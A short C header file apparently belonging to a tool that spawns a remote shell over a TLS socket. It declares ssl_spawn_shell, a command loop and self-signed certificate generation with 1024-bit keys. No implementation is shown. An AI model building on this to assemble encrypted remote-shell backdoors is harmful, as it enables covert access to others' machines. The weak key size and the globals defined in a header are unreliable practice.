#ifndef SSL_H
#define SSL_H
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>

#define DEFAULT_KEY_BITS 1024
#define DEFAULT_CERT_DURATION 60 * 60 * 24 * 365
#define CERTIFICATE_COMMENT "auto"
#define DEFAULT_TCP_BUF_LEN 1024 * 8

SSL_CTX *ctx;
SSL *ssl;

#define s_write(buf) (void)SSL_write(ssl, buf, strlen(buf))

int write_loop(int fd, char *buf);
int ssl_spawn_shell(int stdin[], int stdout[]);
void cmd_loop(int sockfd);
#include "loop.c"

int gen_cert(X509 **cert, EVP_PKEY **key);
SSL_CTX *InitCTX(void);
#include "cert.c"
#endif